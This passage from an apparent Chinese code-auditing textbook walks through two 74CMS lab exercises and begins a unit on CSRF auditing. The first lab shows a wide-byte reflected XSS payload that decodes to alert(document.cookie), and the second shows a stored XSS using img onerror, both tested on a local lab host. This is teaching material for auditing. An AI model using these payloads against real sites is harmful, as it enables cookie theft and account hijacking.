\u672C\u5B9E\u9A8C\u5C06\u5BF974CMS\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u5168\u5C40\u641C\u7D22\u6A21\u5757\u4E2D\uFF0C\u7531\u4E8E\u4F7F\u7528\u7F16\u7801\u5BFC\u81F4Key\u5173\u952E\u5B57\u5B58\u5728\u5BBD\u5B57\u8282\u6CE8\u5165\u6F0F\u6D1E\u3002\u672C\u5B9E\u9A8C\u4ECEjobs-list.htm\u6587\u4EF6\u4E2D\u641C\u7D22\u6846\u76F8\u5173\u7684JS\u4EE3\u7801\u5F00\u59CB\u5206\u6790\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80034.2.1\u8282\uFF1A\u53CD\u5C04\u578BXSS\u6F0F\u6D1E\uFF1B4.3.1\u8282\uFF1A\u7F16\u89E3\u7801\u7ED5\u8FC7\uFF1B4.3.4\u8282\uFF1A\u5BBD\u5B57\u8282\u6CE8\u5165XSS\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u5BBD\u5B57\u8282\u6CE8\u5165XSS\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1B74CMS\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09  \u5BA1\u8BA1\u9636\u6BB5\r
\r
\u5BA1\u8BA1\u8BE5CMS\u4E2D\u7684\u5DE5\u4F5C\u5217\u8868\u524D\u53F0\u9875\u9762\u4EE3\u7801jobs-list.htm\u6587\u4EF6\uFF0C\u70B9\u51FB\u5C55\u5F00\u5DE6\u4FA7templates\\default\u76EE\u5F55\uFF0C\u5F39\u51FA\u7684\u4E0B\u62C9\u5217\u8868\u4E2D\u53CC\u51FBjobs-list.htm\u6587\u4EF6\uFF0C\u5982\u56FE4-21\u6240\u793A\u3002\u8FD9\u6BB5JavaScript\u4EE3\u7801\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u5B9A\u4E49\u53D8\u91CFgetstr\u3001defaultkey\uFF1B\r
\r
l \u5982\u679C\u53D8\u91CFgetkey\u4E0D\u4E3A\u7A7A\u5219\u5C06\u6570\u636E\u53D1\u9001\u5230allaround()\u51FD\u6570\uFF08allaround\u51FD\u6570\u4F4D\u4E8Etemplates/default/js/jquery.jobs-search.js\u6587\u4EF6\u4E2D\u3002\u8BE5\u51FD\u6570\u8FDB\u884CHTML\u9875\u9762\u62FC\u63A5\uFF0C\u7136\u540E\u8C03\u7528\u51FD\u6570search_location\u3002\uFF09\uFF1B\r
\r
l \u5982\u679C{#$smarty.get.key}\u53EF\u4EE5\u95ED\u5408getkey\u53D8\u91CF\u7684\u53CC\u5F15\u53F7\u5C31\u4F1A\u9020\u6210\u53CD\u5C04\u578BXSS\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image268.jpg)\r
\r
\u56FE4-26 jobs-list.htm\u4EE3\u7801\r
\r
\`\`\`\r
\u90A3\u4E48\u54EA\u4E2A\u6587\u4EF6\u8C03\u7528jobs-list.htm\u6A21\u677F\u6587\u4EF6\u5462\uFF1F\u7ECF\u8FC7\u67E5\u770B\u53D1\u73B0\u4E3B\u9875\u641C\u7D22\u6846\u4E2D\u7684\u201C\u641C\u7D22\u201D\u6309\u94AE\u4F1A\u8DF3\u8F6C\u5230/plus/ajax_search_location.php\u6587\u4EF6\uFF0C\u4EE3\u7801\u5982\u56FE4-22\u6240\u793A\u3002\u5BA1\u8BA1\u8BE5\u6587\u4EF6\u6D41\u7A0B\uFF1A\r
l  \u5224\u65AD\u53C2\u6570act\u662F\u5426\u4E3A\u7A7A\uFF0C\u82E5\u4E0D\u4E3A\u7A7A\u5219\u5BF9\u53C2\u6570\u503C\u8FDB\u884Ctrim\u8FC7\u6EE4\uFF0C\u5426\u5219\u7B49\u4E8E\u201CQS_jobslist\u201D\u3002\r
l  \u5C06$_GET['key']\u503C\u4ECEUTF-8\u7F16\u7801\u8F6C\u6362\u4E3AGBK\u7F16\u7801\u3002\r
l  \u8C03\u7528url_rewrite\u51FD\u6570\u8DF3\u8F6C\u5230/jobs/jobs-list.php\u6587\u4EF6\u3002\r
jobs-list.php\u6587\u4EF6\u4EE3\u7801\u5982\u56FE4-23\u6240\u793A\uFF0C\u5176\u8C03\u7528display\u51FD\u6570\u5C06\u4F20\u9012\u53C2\u6570\u6E32\u67D3\u81F3\u754C\u9762\u3002\r
\`\`\`\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image270.jpg)\r
\r
\u56FE4-22 url_rewrite\u8DF3\u8F6C\u4EE3\u7801\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image272.jpg)\r
\r
\u56FE4-23 jobs-list.php\u4EE3\u7801\r
\r
\u81F3\u6B64\uFF0C\u7ED9\u51FAkey\u53C2\u6570\u7684\u4F20\u9012\u6570\u636E\u6D41\uFF0C\u5982\u56FE4-24\u6240\u793A\u3002\u8BE5key\u53C2\u6570\u5E76\u4E0D\u4ECE\u524D\u53F0\u76F4\u63A5\u83B7\u53D6\uFF0C\u800C\u662F\u901A\u8FC7\u8C03\u52A8\u540E\u53F0php\u6587\u4EF6\u6700\u7EC8\u6E32\u67D3\u5F97\u5230\u7684\u3002\u8BE5CMS\u4F7F\u7528\u7684\u5168\u5C40\u8FC7\u6EE4\u51FD\u6570\u5C06\u5BF9\u53CC\u5F15\u53F7\u8FDB\u884C\u8F6C\u4E49\u6389\uFF0C\u4E14\u53C2\u6570key\u4F7F\u7528GBK\u8F6C\u6362\u7F16\u7801\uFF0C\u56E0\u6B64\u8003\u8651\u4F7F\u7528\u5BBD\u5B57\u8282\u6CE8\u5165XSS\u5C06\u8F6C\u4E49\u7684\u53CD\u659C\u6760\u201C\u5403\u6389\u201D\uFF0C\u4ECE\u800C\u95ED\u5408JS\u4E2D\u7684\u53CC\u5F15\u53F7\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image274.jpg)\r
\r
\u56FE4-24 \u53C2\u6570get.key\u6D41\u7A0B\u56FE\r
\r
\uFF082\uFF09    \u6D4B\u8BD5\u9636\u6BB5\r
\r
\u5206\u6790\u524D\u53F0\u9875\u9762\u8BF7\u6C42\u60C5\u51B5\uFF0C\u5982\u56FE4-25\u6240\u793A\u3002\u9996\u9875\u8F93\u5165\u5173\u952E\u5B57\uFF0C\u67E5\u770B\u53D1\u9001HTTP\u8BF7\u6C42\u6570\u636E\u5305\u60C5\u51B5\uFF0C\u5176\u53D1\u9001\u8BF7\u6C42\u4E3A\uFF1Ahttp://192.168.0.11/74cms34/jobs/jobs-list.php?key=11\u3002\r
\r
![\u56FE\u724712](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image276.gif)\r
\r
\u56FE4-25 \u641C\u7D22\u529F\u80FD\u8BF7\u6C42\u56FE\r
\r
\u4E3A\u4E0A\u8FF0HTTP\u8BF7\u6C42\u6784\u9020Payload\uFF0C\u672C\u6B21\u4F7F\u7528\u5BBD\u5B57\u8282\u6CE8\u5165\u53CA\u7F16\u7801\u7ED5\u8FC7\u65B9\u5F0F\u62FC\u63A5JS\u4EE3\u7801\uFF0C\u5176Payload\u5982\u4E0B\uFF1A\r
\r
1%df%22;eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))//;\r
\r
l %df%22\uFF1A%df\u4E3A\u5BBD\u5B57\u8282\u6CE8\u5165\u6807\u8BC6\uFF0C%22\u4E3A\u53CC\u5F15\u53F7\u4ECE\u800C\u95ED\u5408\u6807\u7B7E\uFF1B\r
\r
l 97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41\uFF1A\u7ECF\u8FC7Unicode\u89E3\u7801\u5DE5\u5177\u5F97\u5230\u8BE5\u811A\u672C\u5185\u5BB9\u4E3Aalert(document.cookie)\u3002\r
\r
\u6D4B\u8BD5\u7ED3\u679C\u5982\u56FE4-26\u6240\u793A\u3002\u5F62\u6210\u53CD\u5C04\u578BXSS\u6F0F\u6D1E\uFF0C\u5E76\u6253\u5370\u7528\u6237\u7684Cookie\u503C\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image278.jpg)\r
\r
\u56FE4-26 \u5BBD\u5B57\u8282XSS\u5F39\u7A97\u56FE\r
\r
### 4.5.4  \u5B9E\u9A8C\uFF1A74CMS3.0\u5B58\u50A8XSS\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF974CMS\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u7BA1\u7406\u5458\u7CFB\u7EDF\u7684\u5E7F\u544A\u7BA1\u7406\u6A21\u5757\uFF0C\u8BE5\u6A21\u5757\u4E2D\u7531\u4E8E\u7F16\u7801\u95EE\u9898\u5BFC\u81F4\u53C2\u6570link_logo\u5B58\u5728\u5BBD\u5B57\u8282\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u4ECE\u800C\u6CE8\u5165\u5B58\u50A8\u578BXSS Payload\u3002\u672C\u5B9E\u9A8C\u4ECEadd.htm\u6587\u4EF6\u4E2D\u6DFB\u52A0\u94FE\u63A5\u7684FORM\u8868\u5355\u5F00\u59CB\u5206\u6790\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80034.2.2\u8282\uFF1A\u5B58\u50A8\u578BXSS\u6F0F\u6D1E\uFF1B4.3.4\u8282\uFF1A\u5BBD\u5B57\u8282\u6CE8\u5165XSS\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u5BBD\u5B57\u8282\u6CE8\u5165XSS\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1B74CMS3.0\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09  \u5BA1\u8BA1\u9636\u6BB5\r
\r
l link_logo\u5B57\u6BB5\u5165\u5E93\u6D41\u7A0B\u5206\u6790\uFF1A\r
\r
\u5BA1\u8BA1\u8BE5CMS\u4E2D\u7684\u7BA1\u7406\u5458\u754C\u9762\u201C\u5E7F\u544A\u201D\u9009\u9879\u680F\u4E0B\u201C\u6DFB\u52A0\u94FE\u63A5\u201D\u9875\u9762\u4EE3\u7801templates\\default\\link\\add.htm\u6587\u4EF6\uFF0C\u5F39\u51FA\u7684\u4E0B\u62C9\u5217\u8868\u4E2D\u53CC\u51FBadd.htm\u6587\u4EF6\uFF0C\u5206\u6790\u6DFB\u52A0\u94FE\u63A5\u7684FORM\u8868\u5355\u6587\u4EF6\uFF0C\u8BE5\u8868\u5355\u53D1\u9001HTTP\u7684POST\u8BF7\u6C42\uFF0C\u53D1\u9001\u94FE\u63A5\u4E3A\u201C?act=save\u201D\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<form action="**?act=save**" method="post"> //\u53D1\u9001?act=save\u8BF7\u6C42\u8BA9\u540E\u53F0PHP\u4EE3\u7801\u5904\u7406\r
\r
<table width="100%" border="0" cellspacing="0" cellpadding="5">\r
\r
<tr>\r
\r
<td width="120" align="right">\u7533\u8BF7\u9875\u9762(\u5FC5\u586B)\uFF1A</td>\r
\r
<td width="460">\r
\r
{#foreach from=$cat item=li#} \r
\r
\u2026\u7701\u7565\u2026\r
\r
\r
\r
\u67E5\u627E\u63A5\u6536\u8BE5HTTP\u8BF7\u6C42\u7684PHP\u540E\u53F0\u4EE3\u7801\uFF0C\u5176\u5BF9\u5E94\u7684\u540E\u53F0\u9875\u9762\u6587\u4EF6\u4E3Alink\\add_link.php\u6587\u4EF6\uFF0C\u5982\u56FE4-27\u6240\u793A\u3002\u5176\u4EE3\u7801\u6267\u884C\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u7A0B\u5E8F\u68C0\u6D4B\u7F51\u7AD9\u662F\u5426\u5F00\u542F\u81EA\u52A9\u7533\u8BF7\u94FE\u63A5\uFF0C\u5982\u679C\u6CA1\u6709\uFF0C\u5C06\u963B\u6B62\u7528\u6237\u7533\u8BF7\u3002\r
\r
l \u5C06\u83B7\u53D6\u5230\u7684link_name\u3001link_url\u3001link_logo\u3001app_notes\u7B49\u53C2\u6570\u4F7F\u7528trim\u51FD\u6570\u5904\u7406\uFF0C\u5E76\u8D4B\u503C\u5230setsqlarr\u6570\u7EC4\u4E2D\u3002\r
\r
l \u8C03\u7528inserttable\u51FD\u6570\u5C06setsqlarr\u6570\u7EC4\u6570\u636E\u63D2\u5165\u5230\u6570\u636E\u5E93\u4E2D\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image280.jpg)\r
\r
\u56FE4-27 add_link.php\u4EE3\u7801\r
\r
\`\`\`\r
add_link.php\u6587\u4EF6\u7A0B\u5E8F\u5F00\u59CB\u65F6\uFF0C\u5305\u542B\u4E86\u516C\u5171\u6587\u4EF6common.inc.php\uFF0C\u8BE5\u6587\u4EF6\u5C06\u8C03\u7528\u5C06mystrip_tags\u51FD\u6570\u5C06\u7279\u6B8A\u5B57\u7B26&\u3001"\u3001<\u3001>\u8FDB\u884CHTML\u5B9E\u4F53\u8F6C\u7801\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\`\`\`\r
\r
\r
\r
function mystrip_tags($string)\r
\r
{\r
\r
$string = **str_replace(array('&', '"', '<', '>'), array('&', '"', '<', '>'), $string); //****\u5C06\u7279\u6B8A\u5B57\u7B26\u8FDB\u884CHTML\u5B9E\u4F53\u8F6C\u7801\u66FF\u6362**\r
\r
$string = strip_tags($string);\r
\r
return $string;\r
\r
}\r
\r
\r
\r
l link_logo\u5B57\u6BB5\u524D\u53F0\u663E\u793A\u6D41\u7A0B\u5206\u6790\uFF1A\r
\r
\u540E\u53F0/admin/admin_link.php\u8D1F\u8D23\u7BA1\u7406\u7533\u8BF7\u7684\u53CB\u60C5\u94FE\u63A5\uFF0C\u7A0B\u5E8F\u9996\u5148\u68C0\u67E5\u7BA1\u7406\u5458\u6743\u9650\uFF0C\u7136\u540E\u83B7\u53D6\u524D\u7AEF\u9875\u9762\u4F20\u8FC7\u6765\u8FDB\u884C\u62FC\u63A5SQL\u8BED\u53E5\uFF0C\u5E76\u8FDB\u5165\u5230get_links\u51FD\u6570\u5185\u8FDB\u884C\u6570\u636E\u5E93\u67E5\u8BE2\u3002\r
\r
\u67E5\u8BE2\u5B8C\u6210\u540E\u5C06\u83B7\u5F97\u7ED3\u679C\u4F20\u5165\u5230admin\\templates\\default\\link\\admin_link.htmadmin_link.htm\u6587\u4EF6\u4E2D\uFF0C\u5982\u56FE4-28\u6240\u793A\u3002\u6A21\u677F\u6587\u4EF6\u4E2D\u53C2\u6570\u5305\u62EC\uFF1Alink_id\u3001link_url\u3001link_logo\u3002\u5176\u4E2D\uFF0C\u663E\u793Alogo\u76F4\u63A5\u4F7F\u7528\u6570\u636E\u5E93\u4F20\u5165\u8FC7\u6765\u7684link_logo\u53C2\u6570\uFF0C\u5E76\u4F5C\u4E3Aimg\u56FE\u50CF\u7684src\u53C2\u6570\u4E14\u8BE5\u53C2\u6570\u7528\u6237\u53EF\u63A7\uFF0C\u6240\u4EE5\u6784\u6210\u5B58\u50A8\u578BXSS\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image282.jpg)\r
\r
\u56FE4-28 admin_link.htm\u4EE3\u7801\r
\r
\u81F3\u6B64\uFF0C\u7ED9\u51FA\u53C2\u6570link_logo\u5728\u7A0B\u5E8F\u4E2D\u7684\u4F20\u53C2\u8FC7\u7A0B\uFF0C\u5982\u56FE4-29\u6240\u793A\u3002link_logo\u53C2\u6570\u4F20\u9012\u8FC7\u7A0B\u4E2D\u4F7F\u7528mystrip_tags\u51FD\u6570\u8FC7\u6EE4\u4E0D\u80FD\u4F7F\u7528HTML\u4E0EJS\u6807\u7B7E\uFF0C\u53EF\u4EE5\u8003\u8651\u4F7F\u7528\u4E8B\u4EF6\u6807\u7B7E\u6CE8\u5165XSS\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image284.jpg)\r
\r
\u56FE4-29 link_logo\u53C2\u6570\u4F20\u9012\u8FC7\u7A0B\r
\r
\uFF082\uFF09  \u6D4B\u8BD5\u9636\u6BB5\r
\r
\u8BBE\u8BA1XSS Payload\u7ED5\u8FC7\u51FD\u6570mystrip_tags\u51FD\u6570\uFF0C\u4F7F\u7528Payload\u4E3A\uFF1Ax onerror=alert(1)\u3002\u6784\u9020\u540E\u62FC\u63A5\u524D\u53F0\u663E\u793AHTML\u4EE3\u7801\u4E3A\uFF1A<img src=x onerror=alert(1)/>\u3002\r
\r
\u8BBF\u95EEhttp://192.168.0.11/74cms30\u8FDB\u5165\u7F51\u7AD9\u9996\u9875\uFF0C\u70B9\u51FB\u7F51\u7AD9\u5E95\u90E8\u7684\u201C\u7533\u8BF7\u53CB\u60C5\u8FDE\u63A5\u201D\uFF0C\u5982\u56FE4-30\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image286.jpg)\r
\r
\u56FE4-30 \u6D4B\u8BD5\u56FE1\r
\r
\u5728\u5F39\u51FA\u7684\u9875\u9762\u4E2D\uFF0C\u8F93\u5165\u5982\u4E0B\u8BBE\u8BA1\u597D\u7684Payload\uFF0C\u7136\u540E\u70B9\u51FB\u63D0\u4EA4\u3002\u5176\u4E2DLogo\u5730\u5740\u5904\u4E3A\u771F\u6B63\u7684\u653B\u51FBpayload\uFF0Cx\u4E3A\u4E86\u4F7Fimg\u56FE\u50CF\u62A5\u9519\uFF0C\u7136\u540E\u8C03\u7528onerror\u53C2\u6570\u5F39\u51FA\u5BF9\u8BDD\u6846\uFF0C\u5982\u56FE4-31\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image288.jpg)\r
\r
\u56FE4-31 \u6D4B\u8BD5\u56FE2\r
\r
\u8BBF\u95EEhttp://192.168.0.11/74cms30/admin\u8FDB\u5165\u7BA1\u7406\u5458\u754C\u9762\u5F53\u70B9\u51FB\u201C\u53CB\u60C5\u94FE\u63A5\u201D\uFF0C\u5C06\u9F20\u6807\u79FB\u52A8\u5230LOGO\u4F4D\u7F6E\u5904\uFF0C\u9875\u9762\u4ECE\u6570\u636E\u5E93\u52A0\u8F7D\u5DF2\u521B\u5EFAPayload\u89E6\u53D1\u5F39\u7A97XSS\uFF0C\u5982\u56FE4-32\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image290.jpg)\r
\r
\u56FE4-32 XSS\u6F0F\u6D1E\u5F39\u7A97\u56FE\r
\r
## 4.6 \u5355\u5143\u5C0F\u7ED3\r
\r
\u672C\u5355\u5143\u4E3B\u8981\u5B66\u4E60\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u7684XSS\u6F0F\u6D1E\uFF0C\u901A\u8FC7\u5BF9\u5404\u7C7BXSS\u6F0F\u6D1E\u4ECB\u7ECD\uFF0C\u4F7F\u8BFB\u8005\u719F\u6089\u5BA1\u8BA1XSS\u6F0F\u6D1E\u7684\u65B9\u5F0F\u53CA\u65B9\u6CD5\u3002\u672C\u5355\u5143\u8981\u6C42\u8BFB\u8005\u7740\u91CD\u638C\u63E1\u5404\u7C7BXSS\u6CE8\u5165\u6F0F\u6D1E\u7684PHP\u4EE3\u7801\u5F62\u5F0F\uFF0C\u5E76\u901A\u8FC7\u5BF9\u7B80\u5355CMS\u7684\u4EE3\u7801\u8D70\u8BFB\u5BA1\u8BA1\u4EE3\u7801\u4E2D\u5B58\u5728\u7684XSS\u6F0F\u6D1E\u3002\u4E0B\u56FE4-38\u4E3A\u7B2C\u56DB\u5355\u5143\u603B\u7ED3\u56FE\u3002\r
\r
\r
\r
 \r
\r
# \u5355\u51435 CSRF\u6F0F\u6D1E\u5BA1\u8BA1\r
\r
\u672C\u5355\u5143\u4ECB\u7ECD\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2DCSRF\u6F0F\u6D1E\u5BA1\u8BA1\uFF0C\u5176\u4E3B\u8981\u5206\u4E3A\u56DB\u4E2A\u90E8\u5206\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\u7B2C\u4E00\u90E8\u5206\u4E3B\u8981\u4ECB\u7ECDCSRF\u6F0F\u6D1E\u7684\u57FA\u7840\u77E5\u8BC6\uFF0C\u5305\u62EC\uFF1ACSRF\u6F0F\u6D1E\u653B\u51FB\u8FC7\u7A0B\u3001CSRF\u6F0F\u6D1E\u7684\u653B\u51FB\u573A\u666F\u3001CSRF\u6F0F\u6D1E\u7684\u653B\u51FB\u6761\u4EF6\u3002\r
\r
\u7B2C\u4E8C\u90E8\u5206\u4ECB\u7ECDCSRF\u6F0F\u6D1E\u7684\u5206\u7C7B\uFF0C\u5305\u62EC\uFF1AGET\u578BCSRF\u6F0F\u6D1E\u3001POST\u578BCSRF\u6F0F\u6D1E\u53CA\u4EE3\u7801\u6848\u4F8B\u3002\r
\r
\u7B2C\u4E09\u90E8\u5206\u4ECB\u7ECDCSRF\u6F0F\u6D1E\u7684\u5E38\u89C1\u9632\u5FA1\u673A\u5236\uFF0C\u5305\u62EC\uFF1AHTTP Referer\u5B57\u6BB5\u9632\u5FA1\u3001\u9A8C\u8BC1Token\u9632\u5FA1\u3001\u9A8C\u8BC1\u7801\u9A8C\u8BC1\u6280\u672F\u3002\r
\r
\u7B2C\u56DB\u90E8\u5206\u4F7F\u752874CSM3.0\u4E2D\u589E\u52A0\u7BA1\u7406\u5458\u7684CSRF\u6F0F\u6D1E\u548CYzmCMS5.8\u4E2D\u589E\u52A0\u4F1A\u5458\u7684CSRF\u6F0F\u6D1E\u8FDB\u884C\u5BA1\u8BA1\u5B9E\u8DF5\u3002\r
\r
**\u5355\u5143\u6784\u56FE\uFF1A**\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image292.jpg)\r
\r
**\u5355\u5143\u76EE\u6807\uFF1A**\r
\r
\\1. \u719F\u6089CSRF\u6F0F\u6D1E\u7684\u6982\u5FF5\u53CA\u5206\u7C7B\uFF1B\r
\r
\\2. \u4E86\u89E3CSFR\u6F0F\u6D1E\u7684\u6316\u6398\u6280\u5DE7\uFF1B\r
\r
\\3. \u638C\u63E1CSRF\u6F0F\u6D1E\u7684\u5E38\u89C1\u4EE3\u7801\u5BA1\u8BA1\u65B9\u6CD5\uFF1B\r
\r
\\4. \u638C\u63E1CSRF\u6F0F\u6D1E\u7684\u9632\u5FA1\u65B9\u6CD5\u3002\r
\r
## 5.1 CSRF\u6F0F\u6D1E\u6316\u6398\r
\r
### 5.1.1 CSRF\u6F0F\u6D1E\u7B80\u4ECB\r
\r
CSRF\uFF08Cross-Site Request Forgery\uFF09\u6F0F\u6D1E\u540D\u4E3A\u8DE8\u7AD9\u8BF7\u6C42\u4F2A\u9020\u3002\u76F8\u6BD4XSS\u6F0F\u6D1E\u800C\u8A00\uFF0C\u8BE5\u6F0F\u6D1E\u4E0D\u53CAXSS\u6D41\u884C\uFF0C\u56E0\u6B64\u4E5F\u66F4\u96BE\u9632\u8303\u3002\u7B80\u5355\u7684\u8BF4\uFF0C\u8BE5\u6F0F\u6D1E\u5C06\u4F7F\u5F97\u653B\u51FB\u8005\u4F7F\u7528\u6B63\u5E38\u7528\u6237\u7684\u8EAB\u4EFD\u53D1\u9001\u6076\u610F\u8BF7\u6C42\u3002\u5176\u5BF9\u670D\u52A1\u5668\u800C\u8A00\u662F\u5408\u6CD5\u8BF7\u6C42\uFF0C\u4F46\u662F\u5BF9\u4E8E\u7528\u6237\u800C\u8A00\uFF0C\u653B\u51FB\u8005\u76D7\u7528\u4E86\u5176\u8EAB\u4EFD\u8FDB\u884C\u4E86\u8BF7\u6C42\uFF0C\u4ECE\u800C\u8FBE\u5230\u6076\u610F\u76EE\u7684\u3002\u4F8B\u5982\uFF1A\u653B\u51FB\u8005\u901A\u8FC7\u7528\u6237\u7684\u8EAB\u4EFD\u53D1\u9001\u90AE\u4EF6\u3001\u6DFB\u52A0\u7BA1\u7406\u5458\u8D26\u53F7\u3001\u8D2D\u4E70\u5546\u54C1\uFF0C\u865A\u62DF\u8F6C\u8D26\u7B49\u3002\u8FD9\u5C06\u6CC4\u6F0F\u4E2A\u4EBA\u9690\u79C1\u5E76\u5A01\u80C1\u5230\u76EE\u6807\u7528\u6237\u7684\u8D22\u4EA7\u5B89\u5168\u3002\r
\r
### 5.1.2 CSRF\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C\r
\r
\u5728\u7F51\u7AD9\u5E94\u7528\u4E2D\uFF0CCSRF\u6F0F\u6D1E\u7ECF\u5E38\u51FA\u73B0\u7684\u529F\u80FD\u70B9\u5305\u62EC\uFF1A\u7BA1\u7406\u540E\u53F0\u3001\u4F1A\u5458\u4E2D\u5FC3\u3001\u8BBA\u575B\u5E16\u5B50\u7B49\u4E0E\u6743\u9650\u7D27\u5BC6\u76F8\u5173\u7684\u9875\u9762\u3002\u800C\u5176\u4E2D\u6700\u4E3A\u91CD\u8981\u7684\u5219\u662F\u7BA1\u7406\u540E\u53F0\u7684CSRF\u6F0F\u6D1E\uFF0C\u8FD9\u4E5F\u662FCSRF\u6F0F\u6D1E\u7684\u91CD\u707E\u533A\u3002\r
\r
\u5BF9\u4E8E\u9ED1\u76D2\u6D4B\u8BD5\u800C\u8A00\uFF0C\u7ED9\u51FA\u5982\u4E0B\u51E0\u79CD\u5224\u65AD\u65B9\u6CD5\uFF1A\r
\r
l \u6700\u7B80\u5355\u7684\u65B9\u6CD5\u662F\u6293\u53D6\u7F51\u7AD9\u4E2D\u6B63\u5E38\u8BF7\u6C42\u7684HTTP\u6570\u636E\u5305\uFF0C\u67E5\u770B\u8BE5\u6570\u636E\u5305\u4E2D\u662F\u5426\u5B58\u5728Referer\u5B57\u6BB5\u6216token\u5B57\u6BB5\uFF0C\u82E5\u4E0D\u5B58\u5728\u5219\u6781\u6709\u53EF\u80FD\u5B58\u5728CSRF\u6F0F\u6D1E\u3002\r
\r
l \u5982\u679C\u5B58\u5728Referer\u5B57\u6BB5\uFF0C\u4F46\u662F\u5C06HTTP\u6570\u636E\u5305\u5220\u9664Referer\u5B57\u6BB5\u91CD\u65B0\u63D0\u4EA4\u540E\uFF0C\u8BE5\u63D0\u4EA4\u4F9D\u65E7\u6709\u6548\uFF0C\u90A3\u4E48\u4E5F\u53EF\u4EE5\u786E\u5B9A\u8BE5\u9875\u9762\u5B58\u5728CSRF\u6F0F\u6D1E\u3002\r
\r
l \u9488\u5BF9CSRF\u6F0F\u6D1E\uFF0C\u8FD8\u6D8C\u73B0\u51FA\u4E00\u4E9B\u4E13\u95E8\u9488\u5BF9CSRF\u6F0F\u6D1E\u8FDB\u884C\u68C0\u6D4B\u7684\u5DE5\u5177\uFF0C\u4F8B\u5982\uFF1ACSRFTester\u3001CSRF Request Builder\u7B49\u3002\u5176\u68C0\u6D4B\u539F\u7406\u4E3A\u4F2A\u9020HTTP\u8BF7\u6C42\u5E76\u53D1\u9001\u540E\uFF0C\u5224\u65AD\u662F\u54CD\u5E94\u6210\u529F\u3002\r
\r
\u5728\u4EE3\u7801\u5BA1\u8BA1\u65B9\u9762\uFF0C\u9700\u7740\u91CD\u5BA1\u8BA1\u7F51\u7AD9\u540E\u53F0\u4EE3\u7801\u7684\u5173\u4E8EToken\u548CReferer\u9A8C\u8BC1\u7684\u6838\u5FC3\u6587\u4EF6\uFF0C\u4E5F\u53EF\u76F4\u63A5\u641C\u7D22\u5173\u952E\u5B57\u201Ctoken\u201D\u6216\u201CReferer\u201D\u7B49\u3002\u9488\u5BF9\u4E8ECSRF\u6F0F\u6D1E\u5219\u4E3B\u8981\u8003\u8651\u7F51\u7AD9\u4E2D\u7684\u540E\u53F0\u4EE3\u7801\uFF0C\u9700\u6CE8\u610F\u4EE5\u4E0B\u51E0\u70B9\uFF1A\r
\r
l \u76EE\u6807\u7F51\u7AD9\u7684\u589E\u5220\u6539\u7684\u4EE3\u7801\u903B\u8F91\uFF0C\u662F\u5426\u4F7F\u7528Token\u53CAReferer\u9A8C\u8BC1\uFF1B\r
\r
l \u7528\u6237\u9000\u51FA\u6216\u5173\u95ED\u6D4F\u89C8\u5668\u540E\uFF0CSession\u662F\u90FD\u4F9D\u65E7\u6709\u6548\uFF1B\r
\r
l Token\u4FE1\u606F\u662F\u5426\u8DB3\u591F\u968F\u673A\u800C\u4E0D\u88AB\u731C\u89E3\uFF1B\r
\r
